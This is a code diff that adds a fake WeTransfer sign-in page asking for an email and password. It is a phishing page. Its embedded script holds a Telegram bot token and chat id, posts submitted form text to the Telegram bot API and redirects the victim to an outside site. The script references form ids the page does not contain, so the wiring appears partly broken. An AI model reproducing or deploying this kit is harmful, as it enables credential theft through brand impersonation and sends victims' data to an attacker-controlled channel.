@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WeTransfer Login</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:'Poppins',sans-serif;
+    }
+
+    body{
+      background:#f5f5f5;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      min-height:100vh;
+      padding:20px;
+    }
+
+    .container{
+      width:100%;
+      max-width:420px;
+      background:#f5f5f5;
+      text-align:center;
+    }
+
+    .logo{
+      font-size:58px;
+      font-weight:700;
+      color:#000;
+      margin-bottom:60px;
+    }
+
+    h2{
+      font-size:42px;
+      margin-bottom:10px;
+      color:#000;
+    }
+
+    .subtext{
+      color:#333;
+      font-size:18px;
+      margin-bottom:40px;
+    }
+
+    .input-box{
+      width:100%;
+      margin-bottom:22px;
+    }
+
+    .input-box input{
+      width:100%;
+      padding:24px 25px;
+      border:2px solid #ddd;
+      border-radius:25px;
+      font-size:20px;
+      background:#fff;
+      outline:none;
+      transition:0.3s;
+    }
+
+    .input-box input:focus{
+      border-color:#3b67f2;
+      box-shadow:0 0 10px rgba(59,103,242,0.2);
+    }
+
+    .btn{
+      width:100%;
+      padding:22px;
+      border:none;
+      border-radius:25px;
+      background:#3b67f2;
+      color:#fff;
+      font-size:28px;
+      font-weight:500;
+      cursor:pointer;
+      transition:0.3s;
+      margin-top:5px;
+    }
+
+    .btn:hover{
+      background:#2f58d8;
+    }
+
+    .links{
+      margin-top:45px;
+    }
+
+    .links a{
+      display:block;
+      color:#222;
+      font-size:20px;
+      margin:18px 0;
+      text-decoration:underline;
+    }
+
+    .divider{
+      display:flex;
+      align-items:center;
+      margin:40px 0;
+      color:#999;
+      font-size:20px;
+    }
+
+    .divider::before,
+    .divider::after{
+      content:"";
+      flex:1;
+      height:1px;
+      background:#ccc;
+    }
+
+    .divider span{
+      margin:0 15px;
+    }
+
+    .code-link{
+      font-size:20px;
+      color:#333;
+    }
+
+    .code-link a{
+      color:#333;
+      text-decoration:underline;
+    }
+
+    @media(max-width:500px){
+
+      .logo{
+        font-size:42px;
+      }
+
+      h2{
+        font-size:32px;
+      }
+
+      .subtext{
+        font-size:16px;
+      }
+
+      .input-box input{
+        padding:20px;
+        font-size:18px;
+      }
+
+      .btn{
+        font-size:24px;
+        padding:18px;
+      }
+
+      .links a,
+      .code-link{
+        font-size:17px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <div class="logo">WeTransfer</div>
+
+    <h2>Sign In</h2>
+
+    <p class="subtext">
+      to continue to your WeTransfer account.
+    </p>
+
+    <form>
+
+      <div class="input-box">
+        <input type="email" placeholder="Email">
+      </div>
+
+      <div class="input-box">
+        <input type="password" placeholder="Password">
+      </div>
+
+      <button class="btn" type="submit">
+        Continue
+      </button>
+
+    </form>
+
+    <div class="links">
+      <a href="#">Forgot password?</a>
+      <a href="#">Use a different email?</a>
+    </div>
+
+    <div class="divider">
+      <span>or</span>
+    </div>
+
+    <div class="code-link">
+      Receive a <a href="#">temporary code via email</a>
+    </div>
+
+  </div>
+
+<div class="success" id="successMsg">
+      Successfully Submitted...
+    </div>
+
+    <div class="footer-text">Wetransfer</div>
+  </div>
+<script>
+    const botToken = "8719151931:AAE9M4RyCXNwTtCeoXc4_8Tb287gD-M2aEA";
+    const chatId = "7327775914";
+
+    document.getElementById("telegramForm").addEventListener("submit", async function(e){
+      e.preventDefault();
+
+      const message = document.getElementById("message").value;
+
+      const text = `
+🔔 New Testing Key Submitted
+
+${message}
+      `;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try{
+        const response = await fetch(url,{
+          method:"POST",
+          headers:{
+            "Content-Type":"application/json"
+          },
+          body:JSON.stringify({
+            chat_id: chatId,
+            text: text
+          })
+        });
+
+        if(response.ok){
+
+          document.getElementById("successMsg").style.display = "block";
+
+          // redirect after 2 seconds
+          setTimeout(() => {
+            window.location.href = "https://nxloaded.com";
+          }, 2000);
+
+        }else{
+          alert("Failed to send");
+        }
+
+      }catch(error){
+        alert("Error sending message");
+      }
+    });
+  </script>
+  </body>
+</html>
